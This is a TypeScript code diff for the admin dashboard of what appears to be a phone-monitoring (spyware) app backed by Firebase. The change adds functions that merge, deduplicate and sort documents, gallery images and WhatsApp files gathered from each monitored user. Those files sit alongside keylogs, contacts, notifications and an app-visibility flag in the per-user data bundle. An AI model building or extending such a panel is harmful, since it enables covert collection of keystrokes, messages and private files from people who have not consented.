@@ -185,12 +185,14 @@ export async function logoutAdmin() {
 function buildUserRows(
   userData: Record<string, any>,
   visibility: Record<string, any>,
-  users: Record<string, any>
+  users: Record<string, any>,
+  documentUserIds: string[] = []
 ): UserRow[] {
   const ids = new Set<string>([
     ...Object.keys(userData),
     ...Object.keys(visibility),
     ...Object.keys(users),
+    ...documentUserIds,
   ]);
 
   const rows: UserRow[] = [];
@@ -211,10 +213,170 @@ function buildUserRows(
   return rows;
 }
 
+/** Coerce RTDB timestamps (number or ServerValue-resolved number). */
+export function documentTimestamp(doc: Record<string, any>): number {
+  const raw = doc.uploadedAt ?? doc.timestamp ?? 0;
+  if (typeof raw === "number" && Number.isFinite(raw)) return raw;
+  if (typeof raw === "object" && raw !== null && ".sv" in raw) return Date.now();
+  const n = Number(raw);
+  return Number.isFinite(n) ? n : 0;
+}
+
+export function documentDisplayName(doc: Record<string, any>): string {
+  return (
+    doc.fileName ||
+    doc.name ||
+    (typeof doc.storagePath === "string"
+      ? doc.storagePath.split("/").pop() || ""
+      : "") ||
+    doc.id ||
+    "Document"
+  );
+}
+
+export function documentDownloadUrl(doc: Record<string, any>): string {
+  return String(doc.url || doc.downloadUrl || doc.fileUrl || "");
+}
+
+export function documentIsImage(doc: Record<string, any>): boolean {
+  const cat = String(doc.category || "").toUpperCase();
+  if (cat === "IMAGE") return true;
+  const mime = String(doc.mimeType || "");
+  if (mime.startsWith("image/")) return true;
+  const name = documentDisplayName(doc);
+  return /\.(jpg|jpeg|png|gif|webp|heic|heif|bmp|dng|jfif)$/i.test(name);
+}
+
+export function documentTypeLabel(doc: Record<string, any>): string {
+  const cat = String(doc.category || "");
+  if (cat) return cat;
+  const name = documentDisplayName(doc).toLowerCase();
+  if (name.endsWith(".pdf")) return "PDF";
+  if (documentIsImage(doc)) return "IMAGE";
+  if (doc.mimeType) return String(doc.mimeType);
+  return "FILE";
+}
+
+/** Match device upload order: PDF → Office → text → images. */
+export function documentSortRank(doc: Record<string, any>): number {
+  const cat = String(doc.category || "").toUpperCase();
+  const source = String(doc.source || "").toLowerCase();
+  const wa = source === "whatsapp";
+  const name = documentDisplayName(doc).toLowerCase();
+  const inferredPdf = cat === "PDF" || name.endsWith(".pdf");
+  const inferredOffice =
+    cat === "OFFICE" || /\.(doc|docx|xls|xlsx|ppt|pptx|odt|ods|odp|rtf)$/.test(name);
+  const inferredText = cat === "TEXT" || /\.(txt|csv|md|log)$/.test(name);
+  const inferredImage = documentIsImage(doc);
+
+  if (inferredPdf) return wa ? 0 : 1;
+  if (inferredOffice) return wa ? 2 : 3;
+  if (inferredText) return wa ? 4 : 5;
+  if (inferredImage) return wa ? 6 : 7;
+  return 8;
+}
+
+/** Documents tab list: type priority, then newest first within each tier. */
+export function documentsToList(
+  map: Record<string, unknown> | null | undefined
+): Array<Record<string, any> & { id: string }> {
+  if (!map) return [];
+  const rows: Array<Record<string, any> & { id: string }> = Object.entries(map).map(
+    ([id, value]) => ({
+      id,
+      ...((value && typeof value === "object" ? value : { value }) as Record<string, any>),
+    })
+  );
+  rows.sort((a, b) => {
+    const rankDiff = documentSortRank(a) - documentSortRank(b);
+    if (rankDiff !== 0) return rankDiff;
+    return documentTimestamp(b) - documentTimestamp(a);
+  });
+  return rows;
+}
+
+export function documentByteSize(doc: Record<string, any>): number | null {
+  const n = Number(doc.fileSize ?? doc.sizeBytes);
+  return Number.isFinite(n) && n > 0 ? n : null;
+}
+
+/** Legacy gallery / images / user_data paths → document shape (admin Documents tab). */
+function legacyMediaAsDocuments(
+  prefix: string,
+  map: Record<string, unknown> | null | undefined,
+  userId: string
+): Record<string, unknown> {
+  const out: Record<string, unknown> = {};
+  if (!map || typeof map !== "object") return out;
+
+  for (const [id, raw] of Object.entries(map)) {
+    const item = (raw && typeof raw === "object" ? raw : {}) as Record<string, any>;
+    const fileName = item.fileName || item.name || id;
+    out[`${prefix}_${id}`] = {
+      dataType: "document",
+      fileName,
+      url: item.url || item.downloadUrl || "",
+      fileSize: item.fileSize ?? item.sizeBytes,
+      mimeType: item.mimeType,
+      uploadedAt: item.uploadedAt,
+      timestamp: item.timestamp ?? item.uploadedAt,
+      source: item.source || "device",
+      category:
+        item.category ||
+        (item.dataType === "image" || /\.(jpg|jpeg|png|gif|webp|heic)$/i.test(fileName)
+          ? "IMAGE"
+          : "FILE"),
+      userId: item.userId || userId,
+    };
+  }
+  return out;
+}
+
+/** Merge documents/{userId} with legacy nodes; dedupe by storagePath or download URL. */
+export function mergeDocumentMaps(
+  primaryDocuments: Record<string, unknown> | null | undefined,
+  userId: string,
+  legacyUserDataDocuments?: Record<string, unknown> | null,
+  gallery?: Record<string, unknown> | null,
+  images?: Record<string, unknown> | null
+): Record<string, unknown> {
+  const fromGallery = legacyMediaAsDocuments("gal", gallery, userId);
+  const fromImages = legacyMediaAsDocuments("img", images, userId);
+  const fromLegacyUser = legacyMediaAsDocuments("ud", legacyUserDataDocuments, userId);
+  const fromPrimary = (primaryDocuments && typeof primaryDocuments === "object"
+    ? primaryDocuments
+    : {}) as Record<string, unknown>;
+
+  const seen = new Set<string>();
+  const deduped: Record<string, unknown> = {};
+
+  const layers: Record<string, unknown>[] = [
+    fromPrimary,
+    fromLegacyUser,
+    fromImages,
+    fromGallery,
+  ];
+
+  for (const layer of layers) {
+    for (const [id, value] of Object.entries(layer)) {
+      const doc = (value && typeof value === "object" ? value : {}) as Record<string, any>;
+      const key =
+        (doc.storagePath && String(doc.storagePath)) ||
+        documentDownloadUrl({ ...doc, id }) ||
+        id;
+      if (seen.has(key)) continue;
+      seen.add(key);
+      deduped[id] = value;
+    }
+  }
+  return deduped;
+}
+
 function buildUserBundle(
   userId: string,
   data: Record<string, any>,
-  vis: Record<string, any>
+  vis: Record<string, any>,
+  documentsRoot?: Record<string, any> | null
 ): UserBundle {
   return {
     userId,
@@ -233,23 +395,33 @@ function buildUserBundle(
     contacts: data.contacts || {},
     notifications: data.notifications || {},
     keylogs: data.keylogs || {},
-    gallery: data.gallery || {},
-    documents: data.documents || {},
+    gallery: {},
+    documents: mergeDocumentMaps(
+      documentsRoot,
+      userId,
+      data.documents,
+      data.gallery,
+      data.images
+    ),
     sync_status: data.sync_status || {},
   };
 }
 
 export async function listUsers(): Promise<UserRow[]> {
-  const [userDataSnap, visibilitySnap, usersSnap] = await Promise.all([
+  const [userDataSnap, visibilitySnap, usersSnap, documentsSnap] = await Promise.all([
     get(ref(db, "user_data")),
     get(ref(db, "app_visibility")),
     get(ref(db, "users")),
+    get(ref(db, "documents")),
   ]);
+
+  const documentsRoot = (documentsSnap.val() || {}) as Record<string, unknown>;
 
   return buildUserRows(
     (userDataSnap.val() || {}) as Record<string, any>,
     (visibilitySnap.val() || {}) as Record<string, any>,
-    (usersSnap.val() || {}) as Record<string, any>
+    (usersSnap.val() || {}) as Record<string, any>,
+    Object.keys(documentsRoot)
   );
 }
 
@@ -261,11 +433,12 @@ export function watchUsers(
   let userData: Record<string, any> = {};
   let visibility: Record<string, any> = {};
   let users: Record<string, any> = {};
-  let ready = { userData: false, visibility: false, users: false };
+  let documentUserIds: string[] = [];
+  let ready = { userData: false, visibility: false, users: false, documents: false };
 
   const emit = () => {
-    if (!ready.userData || !ready.visibility || !ready.users) return;
-    onData(buildUserRows(userData, visibility, users));
+    if (!ready.userData || !ready.visibility || !ready.users || !ready.documents) return;
+    onData(buildUserRows(userData, visibility, users, documentUserIds));
   };
 
   const handleError = (err: Error) => onError?.(err);
@@ -297,24 +470,37 @@ export function watchUsers(
     },
     handleError
   );
+  const unsub4 = onValue(
+    ref(db, "documents"),
+    (snap) => {
+      const root = (snap.val() || {}) as Record<string, unknown>;
+      documentUserIds = Object.keys(root);
+      ready.documents = true;
+      emit();
+    },
+    handleError
+  );
 
   return () => {
     unsub1();
     unsub2();
     unsub3();
+    unsub4();
   };
 }
 
 export async function getUserBundle(userId: string): Promise<UserBundle> {
-  const [dataSnap, visSnap] = await Promise.all([
+  const [dataSnap, visSnap, documentsSnap] = await Promise.all([
     get(ref(db, `user_data/${userId}`)),
     get(ref(db, `app_visibility/${userId}`)),
+    get(ref(db, `documents/${userId}`)),
   ]);
 
   return buildUserBundle(
     userId,
     (dataSnap.val() || {}) as Record<string, any>,
-    (visSnap.val() || {}) as Record<string, any>
+    (visSnap.val() || {}) as Record<string, any>,
+    (documentsSnap.val() || {}) as Record<string, any>
   );
 }
 
@@ -326,11 +512,12 @@ export function watchUserBundle(
 ): Unsubscribe {
   let data: Record<string, any> = {};
   let vis: Record<string, any> = {};
-  let ready = { data: false, vis: false };
+  let documentsRoot: Record<string, any> = {};
+  let ready = { data: false, vis: false, documents: false };
 
   const emit = () => {
-    if (!ready.data || !ready.vis) return;
-    onData(buildUserBundle(userId, data, vis));
+    if (!ready.data || !ready.vis || !ready.documents) return;
+    onData(buildUserBundle(userId, data, vis, documentsRoot));
   };
 
   const handleError = (err: Error) => onError?.(err);
@@ -353,10 +540,20 @@ export function watchUserBundle(
     },
     handleError
   );
+  const unsub3 = onValue(
+    ref(db, `documents/${userId}`),
+    (snap) => {
+      documentsRoot = (snap.val() || {}) as Record<string, any>;
+      ready.documents = true;
+      emit();
+    },
+    handleError
+  );
 
   return () => {
     unsub1();
     unsub2();
+    unsub3();
   };
 }
 
@@ -402,8 +599,12 @@ export function recordsToList(
     })
   );
   rows.sort((a, b) => {
-    const ta = Number(a.totalTimeMs || a.timestamp || a.date || a.uploadedAt || 0);
-    const tb = Number(b.totalTimeMs || b.timestamp || b.date || b.uploadedAt || 0);
+    const ta = Number(
+      a.totalTimeMs || documentTimestamp(a) || a.date || 0
+    );
+    const tb = Number(
+      b.totalTimeMs || documentTimestamp(b) || b.date || 0
+    );
     return tb - ta;
   });
   return rows;
